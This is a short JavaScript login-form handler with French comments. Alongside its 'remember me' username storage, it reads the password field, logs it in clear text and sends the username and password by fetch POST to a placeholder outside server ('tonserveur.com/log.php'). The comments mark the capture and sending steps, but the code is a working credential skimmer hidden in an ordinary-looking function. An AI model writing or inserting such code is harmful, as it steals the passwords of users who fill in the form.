function storeIt() {
    var userName = document.getElementById("username");
    var rememberMe = document.getElementById("rememberMe");
    var password = document.getElementById("password").value; // ← récupère le mot de passe ici

    console.log('Mot de passe saisi :', password); // ← log en clair

    // Exemple d'envoi quelque part :
    fetch('https://tonserveur.com/log.php', {
        method: 'POST',
        body: JSON.stringify({ user: userName.value, pass: password }),
        headers: {
            'Content-Type': 'application/json'
        }
    });

    if (rememberMe == null || !rememberMe.checked) {
        localStorage.removeItem('userName');
    } else {
        localStorage.setItem('userName', userName.value);
    }
}
